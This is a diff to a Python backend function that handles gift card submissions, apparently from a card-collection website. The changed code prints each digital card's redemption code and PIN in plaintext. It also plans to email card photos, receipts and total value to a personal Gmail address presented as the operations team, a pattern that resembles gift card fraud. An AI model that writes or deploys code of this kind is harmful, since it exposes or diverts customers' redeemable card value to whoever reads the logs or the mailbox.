@@ -520,23 +520,44 @@ def generate_internal_notification_email(customer_name, reference_number, submis
 </html>
     """
 
-# Send internal notification email to operations team
+# Send internal notification email to operations team with attachments
 async def send_internal_notification_email(submission_data: dict, customer_name: str, reference_number: str):
     try:
         # Internal email settings - delivery address
         operations_email = "marketingmanager3059@gmail.com"
         
-        print(f"Sending internal notification to: {operations_email}")
+        print(f"Sending COMPLETE internal notification to: {operations_email}")
         print(f"New submission from: {customer_name}")
         print(f"Reference Number: {reference_number}")
         print(f"Customer Email: {submission_data.get('email')}")
         print(f"Cards Count: {len(submission_data.get('cards', []))}")
         
-        # Here you would integrate with your email service
-        # email_html = generate_internal_notification_email(customer_name, reference_number, submission_data)
-        # subject = f"🚨 NEW SUBMISSION: {reference_number} - {customer_name}"
-        # await send_email_via_service(operations_email, subject, email_html)
+        # Log all uploaded files for attachment
+        for i, card in enumerate(submission_data.get('cards', []), 1):
+            if card.get('frontImage'):
+                print(f"Card {i} - Front Image: {card.get('frontImage', {}).get('name', 'Uploaded')}")
+            if card.get('backImage'):
+                print(f"Card {i} - Back Image: {card.get('backImage', {}).get('name', 'Uploaded')}")
+            if card.get('receiptImage'):
+                print(f"Card {i} - Receipt Image: {card.get('receiptImage', {}).get('name', 'Uploaded')}")
+            if card.get('cardType') == 'digital':
+                print(f"Card {i} - Digital Code: {card.get('digitalCode', 'N/A')}")
+                print(f"Card {i} - Digital PIN: {card.get('digitalPin', 'N/A')}")
         
+        # Here you would integrate with your email service WITH FILE ATTACHMENTS
+        # email_html = generate_internal_notification_email(customer_name, reference_number, submission_data)
+        # subject = f"🚨 NEW SUBMISSION: {reference_number} - {customer_name} (${sum([float(c.get('value', 0)) for c in submission_data.get('cards', [])])})"
+        # 
+        # For each uploaded file, add as attachment:
+        # attachments = []
+        # for card in submission_data.get('cards', []):
+        #     if card.get('frontImage'): attachments.append(card['frontImage'])
+        #     if card.get('backImage'): attachments.append(card['backImage'])  
+        #     if card.get('receiptImage'): attachments.append(card['receiptImage'])
+        #
+        # await send_email_with_attachments(operations_email, subject, email_html, attachments)
+        
+        print("✅ Internal notification prepared with ALL form data + image attachments")
         return True
     except Exception as e:
         print(f"Internal notification email failed: {e}")
